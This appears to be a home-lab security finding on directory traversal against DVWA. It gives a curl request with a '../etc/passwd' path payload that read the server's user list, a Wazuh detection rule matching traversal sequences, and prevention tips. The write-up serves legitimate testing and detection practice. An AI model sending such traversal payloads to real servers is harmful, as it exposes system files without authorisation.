# Finding 005 — Directory Traversal

**Date:** 2026-04-30
**Target:** 192.168.56.30 (DVWA)
**Tool:** curl, Burp Suite
**MITRE ATT&CK:** T1083 — File and Directory Discovery (Discovery)
**Wazuh detected:** ⚠️ Partial — low level alert only

---

## What I did

```bash
curl "http://192.168.56.30/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd"
```

Response included `/etc/passwd` — full server user list.

---

## Custom rule I added

```xml
<rule id="100011" level="10">
  <if_group>web_log</if_group>
  <regex>\.\.\/|%2e%2e%2f</regex>
  <description>Directory traversal attempt — T1083</description>
  <mitre><id>T1083</id></mitre>
</rule>
```

---

## Prevention

- Validate and sanitise all user input — reject `../`
- `open_basedir` restriction in PHP
- WAF

**Severity:** High — server filesystem readable
